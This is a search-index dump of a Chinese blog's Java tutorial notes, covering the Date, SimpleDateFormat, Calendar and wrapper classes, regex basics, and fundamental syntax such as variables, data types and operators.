Object中的 protected void finalize(): 当垃圾回收器确定不存在对该对象的更多引用时，由对象的垃圾回收器调用此方法。 可以重写并加入一些首尾的工作。 代码示例： public class SystemDemo { public static void main(String[] args) { new Demomo(); System.gc();//多次执行后，输出：\"我被回收了\" } } class Demomo{//默认继承并重写Object的finalize方法 @Override protected void finalize() throws Throwable { // TODO Auto-generated method stub System.out.println(\"我被回收了\"); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:6","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:11:7","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Date ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:12:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"类 Date 概述 表示特定的瞬间，精确到毫秒。 可以通过方法来设定自己所表示的时间，可以表示任意时间。 util包和sql包(util的子类)下都有同名Date类，现在主要看util下的 注意导包不要导错。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:12:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Date类的构造方法 空构造 Date(): 创建的是一个表示当前系统时间的Date对象。 toLocaleString方法：返回系统时区格式相匹配的方法，但是过时了 代码示例： import java.util.Date; public class DateDemo { public static void main(String[] args) { Date d = new Date(); System.out.println(d);//Fri May 13 18:43:35 CST 2022 System.out.println(d.toLocaleString());//2022年5月13日 下午6:44:02 } } 有参构造Date(long date)：参数为毫秒值的构造方法 根据“指定时间”创建Date对象 基本时间仍然是：1970-1-1 00:00:00 + 时区差 参数：在基本时间基础上添加的毫秒数之后的date值 代码示例： import java.util.Date; public class DateDemo { public static void main(String[] args) { Date d2 = new Date(1000 * 60 * 60 * 24);//基本时间+1秒*1分*1小时*1天 System.out.println(d2.toLocaleString());//1970年1月2日 上午8:00:00 - 8点是东八区快8小时 } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:12:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Date类要掌握的功能 毫秒到日期的转换 void setTime(long time); 使用给定毫秒时间值设置现有 Date 对象 设置date，返回值是void，参数是long。 毫秒值到date值的其他方法：Date(long date)：参考上面的带参构造方法 日期到毫秒的转换 long getTime(); 获取值，返回值是long，参数是void 代码示例： import java.util.Date; public class DateDemo { public static void main(String[] args) { Date d = new Date(); d.setTime(1000 * 60 * 60); System.out.println(d.toLocaleString()); System.out.println(d.getTime()); } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:12:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:12:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"DateFormat ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:13:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"DateFormat概述 DateFormat类是对日期进行格式化的类 位于java.text包下： 这个包下大部分是格式化相关的类 DateFormat: 抽象类 抽象类的使用：通过子类调用 / 通过静态方法调用 直接已知子类：SampleDateFormat: SampleDateFormat：以与语言环境有关的方式来格式化和解析日期的具体类，允许进行格式化(日期-\u003e文本)、解析(文本-\u003e日期)和规范化。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:13:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"DateFormat要掌握的功能 从日期到字符串的转换：格式化 Date to String eg. 想要\"2049年8月26日\"而不是\"2049-8-26\"这种格式 String format(Date date) 从字符串到日期的转换：解析 String to Date eg. 想要\"2049年8月26日\"的后一天 Date parse(String sourse) 构造方法： SimpleDateFormat(): 使用默认的模式进行对象的构建 示例：SimpleDateFormat sdf = new SimpleDateFormat(); SimpleDateFormat(Sting pattern): 使用指定的模式进行对象的构建 示例：SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\"); 指定模式： API规定的模式字母（所有其他字符 ‘A’ 到 ‘Z’ 和 ‘a’ 到 ‘z’ 都被保留） 详见API SampleDateFormat文档 常用： 年 月 日 时:分:秒 – yyyy年MM月dd日 HH:mm:ss 注意： 需要导入相应的包 解析的字符串，模式必须和构建对象的模式一样； 否则会报错：java.text.ParseException PS: parse |pa:z| 解析 代码示例： import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Date; //class... public static void main(String[] args) throws ParseException {//抛出异常：sdf.parse() //使用默认模式进行对象的构建 SimpleDateFormat sdf = new SimpleDateFormat(); Date d = new Date();//创建日期对象 //格式化：把日期对象转换成字符串 String s = sdf.format(d); System.out.println(s);//2022/5/16 下午6:24 //解析：把字符串转换成日期对象 Date date = sdf.parse(\"2022/5/16 下午6:24\"); System.out.println(date.toLocaleString());//2022年5月16日 下午6:24:00 //Date date2 = sdf.parse(\"2020年2月28日\");//Exception in thread \"main\" java.text.ParseException: Unparseable date: \"2020年2月28日\" } public static void main(String[] args) throws ParseException { SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH:mm:ss\");//指定模式的构造方法 Date d = new Date(); String s = sdf.format(d);//格式化 System.out.println(s);//2022年05月16日 18:44:45 Date date = sdf.parse(\"2088年05月16日 18:44:45\");//解析 System.out.println(date.toLocaleString());//2088年5月16日 下午6:44:45 (修改传入的日期，则输出结果也相应地改变) } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:13:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:13:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Calendar ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:14:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Calendar类概述 日历类，用于替代Date类的使用。 它里面提供了很多功能来单独获取日历的某个数据。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:14:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Calendar类的使用 util包下 import java.util.Calendar; 抽象类，但是提供方法用于获取子类对象 创建对象: static Calendar getInstance(): 使用默认时区和语言环境获得一个日历 静态，直接类名调用 代码示例： Calendar c = Calendar.getInstance(); 获取 int get(int field): 返回指定日历字段的值 field: 给定的日历字段，即已经定义好的字符，可以由字段名调用 注意： MONTH: 在格里高利历和罗马儒略历中一年中的第一个月是 JANUARY，它为 0 – 因此需要在获取值的基础上+1才是想要获取到的值 示例： public static final int YEAR = 1 System.out.println(Calendar.YEAR);//输出：1 代码示例： import java.util.Calendar; public class CalendarDemo { public static void main(String[] args) { Calendar c = Calendar.getInstance(); //System.out.println(Calendar.YEAR);//1 int year = c.get(Calendar.YEAR); int month = c.get(Calendar.MONTH) + 1;//此处注意MONTH的起始值是0，实际月应+1 int day = c.get(Calendar.DAY_OF_MONTH); System.out.println(year + \"年\" + month + \"月\" + day + \"日\");//2022年5月16日 //注意：year等变量是int类型，syso语句直接用加号+连接会数值相加 } } 修改 void set(int field, int value): 把指定字段field修改为指定的值 示例： c.set(Calendar.YEAR, 1999); int year = c.get(Calendar.YEAR); syso(year);//输出：1999 添加 void add(int field, int value): 在指定字段上加上指定的值 示例： c.add(Calendar.MONTH, -3);//可以是负数(时间倒流)，和可以超过12(自动累加到第二年) int month = c.get(Calendar.MONTH)+1; syso(month);//2022年2月17日 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:14:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:14:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"包装类 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"概述 由于基本数据类型只能做一些简单的操作和运算，所以Java为我们封装了基本数据类型，为每种数据类型提供了包装类。 包装类：封住了基本数据类型的类，提供了更多的复杂方法和一些变量。 位置：lang包下，不需要导包 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"组成 byte —- Byte short —- Short char —- Character int —- Interger long —- Long float —- Float double —- Double boolean —- Boolean ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Integer 其他包装类操作类似 构造方法： Integer(int value) Integer i = new Integer(23);//i是Integer类型(getClass()可得) Integer(String s) 示例：Integer i = new Integer(\"10\");//i是Integer类型(getClass()可得) String to int的转换 方式1：int intValue() 没有参数，返回值是int，需要创建Integer对象 代码示例： Integer i = new Integer(\"10\"); System.out.println(i.getClass());//class java.lang.Integer int num = i.intValue(); System.out.println(num+10);//20; PS num没有Class()方法 方式2：static int parseInt(String s) 静态方法，Integer类名调用，传入String类型参数，返回int 代码示例: int num2 = Integer.parseInt(\"10\"); System.out.println(num2 + 10);//20 int to String的转换 方式1：直接加空字符串 +\"\" 方式2：String toString() 代码示例： Integer i2 = new Integer(23); System.out.println(i2.getClass());//class java.lang.Integer String s1 = i2.toString(); System.out.println(s1.getClass());//class java.lang.String 方式3：static String toString(int i) 静态方法，类名调用 代码示例： String s2 = Integer.toString(10); System.out.println(s2.getClass());//class java.lang.String ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"自动装箱和拆箱 自动装箱和拆箱： JDK 1.5的特性 装箱：基本数据类型转换为包装类对象 拆箱：包装类对象转换为基本数据类型 java虚拟机帮我们做了装箱和拆箱的动作，我们只需要做简单的代码即可。 自动装箱： Integer i = 10; 相当于：Integer i = new Integer(10); 自动拆箱： Integer i = 10; int a = i; 相当于：int a = i.intValue(); 装箱拆箱组合： Integer i = 10; Integer i2 = 20; Integer i3 = i + i2; //相当于： //Integer i3 = new Integer(i.intValue() + i2.intValue()); ArrayList list = new ArrayList();//集合存储对象 list.add(1);//自动装箱：list.add(new Integer(1)); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:15:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"正则表达式 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"浅谈正则表达式 概述 regex: 位于Pattern类 定义了字符串的模式, 可以用来搜索、编辑或处理文本。 是指一个用来描述或者匹配一系列符合某个句法规则的字符串的单个字符串。其实就是一种规则。 String包含多个regex相关的方法 匹配：boolean matches(String regex) 告知此字符串是否匹配给定的正则表达式。 附有正则表达式相关知识，可查阅学习 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"正则表达式的常用规则 字符： x：字符 x \\\\：反斜线字符 字符类： [abc]: a、b 或 c（简单类） [^abc]: 任何字符，除了 a、b 或 c（否定） [a-zA-Z]: a 到 z 或 A 到 Z，两头的字母包括在内（范围) 预定义字符类： .: 任何字符（与行结束符可能匹配也可能不匹配） \\d: 数字：[0-9] \\D: 非数字： [^0-9] \\s: 空白字符：[ \\t\\n\\x0B\\f\\r] \\S: 非空白字符：[^\\s] \\w: 单词字符：[a-zA-Z_0-9] \\W: 非单词字符：[^\\w] Greedy 数量词: X?: X，一次或一次也没有 X*: X，零次或多次 X+: X，一次或多次 X{n}: X，恰好 n 次 X{n,}: X，至少 n 次 X{n,m}: X，至少 n 次，但是不超过 m 次 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"示例： 要求：写一个qq号并需要符合下列要求： 必须5-15位； 不能以0开头； 必须都是数字。 思路： 都是数字，直接用0-9的数字范围； 第一位和后几位分开判断； 后几位加元素个数范围。 代码示例： String s3 = \"0123456\"; Boolean flag = s3.matches(\"[1-9][0-9]{4,15}\");//巧用正则表达式，免去复杂的if-else判断 System.out.println(flag);//true ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"END ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:16:5","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"目录 注释：单行、多行、文档、嵌套 关键字：定义、特点 标识符：组成规则、命名规范 常量：常量分类 变量：概述、定义格式、定义注意事项 计算机存储单元：bit-B-KB-MB-GB-TB-… 数据类型：基本数据类型、引用数据类型、类型转换：显式隐式 运算符：算术运算符、赋值运算符、关系运算符、逻辑运算符、三元运算符、位运算符 程序流程控制：顺序结构、选择结构(if,switch)、循环结构(for,while,do…while) 数组：一维数组、二维数组、数组初始化、对象地址值、数组常见问题 java内存分配：5片内存区、栈、堆、数组示例图解 方法：方法概述、方法格式、写方法、方法调用、方法重载、方法参数传递问题 基础语法练习：月份对应季节、斐波那契数列、数组元素反转、加密数字 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:0:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"注释 单行注释: //注释文字 多行注释: /* 注释文字 */ eclipse中，输入/*之后直接回车即可显示多行注释，并且光标定位在可输入注释位置。 文档注释: /** 注释文字 */ 注释的作用: 解释说明程序，提高程序的阅读性 注释的嵌套： 单行可以相互嵌套，多行可以嵌套单行，多行不可嵌套多行。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:1:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:1:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"关键字 关键字：被Java语言赋予特定含义的单词 关键字特点： 全部小写； 常见的代码编辑器会对关键字有特殊的颜色标记。 熟悉常见关键字，可以会考查： 数据类型，数据类型值，修饰符，类类关系，实例相关，异常处理，包等。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:2:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:2:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"标识符 作用：包,类,方法,变量等的命名 组成规则 由字符(字母汉字数字)，下划线_，美元符$组成 字符：unicode字符集，包括英文大小写字母，中文字符，数字字符等；不建议使用中文字符。 不能以数字开头(美元符号、下划线都可以)； 不能是Java中的关键字。 命名规则：见名知意 包(文件夹) ：全部小写，多级包用点隔开。xxxyyyzzz，com.itheima。 类：每个单词首字母大写。XxxYyyZzz。 变量或者方法：第一个单词首字母小写，从第二个单词开始每个单词首字母大写。xxxYyyZzz。 java源码命名：java文件名应与代码中public类的名字相同。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:3:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:3:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"常量 常量：在程序执行的过程中，其值不可以发生改变的量。 常量分类： 字符串常量(\"\")；整数常量；小数常量；字符常量(’’)；布尔常量(true和false)；空常量(null)。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:4:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:4:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"变量 变量概述：在程序执行的过程中，在某个范围内其值可以发生改变的量 本质讲：变量是内存中的一小块区域。(配合图示食用) 区域限定：用数据类型限定 (eg. 苹果的价格是数字，不能是字符串..) 区域名称：变量名。 区域内容：初始化值。 变量定义格式： 数据类型 变量名 = 初始化值; 数据类型 变量名; 变量名 = 初始化值; 变量定义的注意事项： 变量未赋值，不能直接使用；(否则会报错’未初始化‘) 注意精度：定义long型或float型需要在数字末尾加L或F标记； 注意范围：变量只在所属范围内有效，范围用大括号划分(代码块)； 同一范围内，变量名不能重复； 同一行可以定义多个变量，但是不建议 (看起来更清楚一些)。 关于变量与代码块的测试： 不能同名，但代码块中的变量不能在代码块外使用 //测试1：代码块内外变量重名 int a = 123; { int a = 456; //会报错，提示重名 (虽然是在代码块内外，但第二个a定义时，已经有a这个变量名存在了) } System.out.println(b); //测试2：在代码块以外使用变量 int a = 123; { int b = 456; } System.out.println(b); //会报错，提示找不到符号 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:5:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:5:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"计算机存储单元 变量是内存中的小容器，用来存储数据。 计算机存储设备的最小信息单元叫“位（bit）”，又称“比特位”，通常用小写的字母b表示。 计算机最小的存储单元叫“字节（byte）”，通常用大写字母B表示，字节是由连续的8个位组成。 除了字节外的一些常用的存储单位：1024进率 (特殊: 1B=8bit) bit-B-KB-MB-GB-TB-… ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:6:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:6:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数据类型 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"Java语言是强类型语言 对于每一种数据都给出了明确的数据类型； 不同的数据类型：分配不同的内存空间，表示不同的数据大小。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"常见数据类型：基本数据类型 + 引用数据类型 基本数据类型：4类8种 整数：byte-1，short-2，int-4，long-8； 浮点数：float-4，double-8； 字符：char-2； 布尔：boolean-1； 注：数字表示所占字节数 引用数据类型：类，数组，接口。 整数默认int型，浮点数默认double型。 long类型定义时在数字末尾加L，float类型定义时在数字末尾加F(可小写，建议大写，更清晰)。 否则会报错：整数不加L默认int类型，会报错’过大的整数‘；float不加F默认double类型，会报错’可能损失精度‘。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"数据类型转换：显式/隐式 隐式转换/默认转换： 一般由小到大 运算时，存在更高级类型则自动提升：byte,short,char—\u003eint—\u003elong—\u003efloat—\u003edouble byte,short,char相互之间不转换，他们参与运算首先转换为int类型 boolean类型不能转换为其他的数据类型 显式转换/强制转换： 一般由大到小；可能会损失精度。 格式：目标类型 变量名=(目标类型)(被转换的数据); 例如：byte d = (byte)(a+b); 建议：数据做运算，结果应该是什么类型就用什么类型接受，不要随意转换类型，否则会有精度的损失。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:7:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"运算符 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:0","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"定义 运算符：对常量和变量进行操作的符号称为运算符. 表达式：用运算符把常量或者变量连接起来符合java语法的式子就可以称为表达式。 不同运算符连接的式子体现的是不同类型的表达式。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:1","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"算术运算符 加减乘除 +,-,*,/ ： 加减乘正常； 除法：注意int相除只能得到int，要想得到小数，就必须有浮点型参与运算。 取余 %： 整除的余数； 应用1：对2取余结果为0或1，可以实现开关算法切换； 应用2：任何数对某数取余，结果必小于被取余数，可以实现将结果控制在某数范围内。 取模与取余： Java中取余和取模是不同的，取余是%，而取模是Math.FloorMod(); c和c++中取模为%，而Python中取模为%。 取余，遵循尽可能让商向0靠近的原则; 取模，遵循尽可能让商向负无穷靠近的原则(fix()和floor()两个函数的不同) 当a b同正负，则结果一致；当a和b不同正负，则取余结果正负同a，取模结果正负同b。 示例： 7 % 4 = 3, Math.FloorMod(7,4)=3; (-7) % (-4) = -3, Math.FloorMod(-7,-4) = -3. 7 % (-4) = 3, Math.floorMod(7, -4) = -1; (-7) % 4 = -3, Math.floorMod(-7, 4) = 1. 注：7 % (-4) = (-4)(-1)+3, 而 Math.FloorMod(7,-4) = (-4)(-2)+(-1) 参考链接：Java取模和取余，你真的弄懂了吗？ 加号 +： 数值变量相加是加法运算。 字符参与加法运算：字符在计算机中存储的数据值来参与运算； 常见字符值：A-65,a-97, 0-48 字符串参与加法运算：和其他类型的数据做拼接，结果是字符串类型的。 示例： 设置int a = 10, b = 20; 则打印(\"hello\" + a)，结果是hello10，直接拼接； 则打印(\"hello\" + a + b)，结果是hello1020，直接拼接； 则打印(a + b + \"hello\")，结果是30hello，从左往右，先计算后拼接。 自增自减 ++--： ++--可以放在变量的左侧或者右侧，均可。 单独使用时，放在左右，结果没有区别； 参与其他运算时： a++：先拿变量做操作运算，后变量自增自减； 注：内存表示中，(b=a++为例) 会先取出变量初始值存起来，然后进行运算即a+=1，然后把存起来的初始值赋值给b。 ++a: 先变量自增自减，后拿变量做操作运算。 注：简单记忆为”谁(指变量或加加减减)在前先操作谁“ eg. ，变量在前运算后自增自减，符号在前先自增自减。 注意：Python没有这样的自增，是按照正常写a=a+1;，或者a+=1 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:2","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"赋值运算符 基本赋值运算符：= 与逻辑运算符等等于==区别。 扩展赋值运算符：+=, -=, *=, /=,... 注意：此类运算符隐含强制类型转换，\u003c即强制转换为左侧的数据类型\u003e。(潜在考点，可能见于笔试小题) 示例：byte a;时：a+=10;相当于a=(a的数据类型)(a+10);，但a=a+10就可能因为数据类型不一致而报错。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:3","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"关系运算符 符号包含：==,!=,\u003e,\u003e=,\u003c,\u003c= 结果类型：关系运算符的结果都是boolean型，true或false。 注意：关系运算符“==”不能误写成“=” 。 输出(a==b): 判断a与b是否相等，然后输出比较结果。 输出(a=b): 把b的值赋值给a，然后将a的值输出。 注意：如果在布尔型变量位置出现a=b，要知道此处的结果。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:8:4","tags":["Java","语法"],"title":"Java基础语法","uri":"/articles/2024/03/java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["Java"],"content":"逻辑运算符 逻辑运算符用于连接关系表达式 注意：在Java中不可以写成3\u003cx\u003c6，应该写成x\u003e3 \u0026\u0026 x\u003c6。 